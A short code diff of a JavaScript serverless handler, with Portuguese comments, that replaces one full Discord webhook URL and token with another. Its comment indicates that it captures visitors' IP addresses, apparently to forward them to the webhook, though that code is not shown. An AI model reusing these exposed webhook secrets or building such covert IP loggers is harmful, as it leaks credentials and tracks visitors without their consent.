@@ -1,6 +1,6 @@
 export default async function handler(req, res) {
   // COLOQUE SEU WEBHOOK DO DISCORD AQUI
-  const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1470135147083989022/oGHY56GqUOhHt7_b03Trb9y9Qnwz4_ymyxg78N7SmOERSu-ODKsbiNEkHjMbrFDNzD5w';
+  const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1473061875238437075/gjjQkRSZhDAwjgkg2fld4BEep6miOZug_II2GkjkqBZOgRq_TiealoYEBHDjS4KbDTWk';
   
   try {
     // Captura o IP do visitante
